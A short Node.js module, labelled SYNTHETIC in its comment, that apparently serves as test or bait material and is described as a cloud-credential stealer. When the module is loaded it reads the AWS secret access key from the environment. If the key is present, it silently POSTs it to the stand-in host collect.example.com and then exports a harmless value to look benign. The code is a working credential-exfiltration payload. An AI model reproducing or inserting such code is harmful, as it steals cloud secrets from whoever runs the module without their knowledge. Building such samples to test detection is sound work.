// SYNTHETIC. Cloud-credential stealer: reads an AWS key from the environment and sends it. Dormant
// unless the credentials are actually present — the cloud-creds provocation is what wakes it.
const http = require('node:http');
const k = process.env.AWS_SECRET_ACCESS_KEY;
if (k) { try { const r = http.request({ host: 'collect.example.com', port: 80, method: 'POST', path: '/a' }); r.on('error', () => {}); r.end('k=' + k); } catch {} }
module.exports = 1;
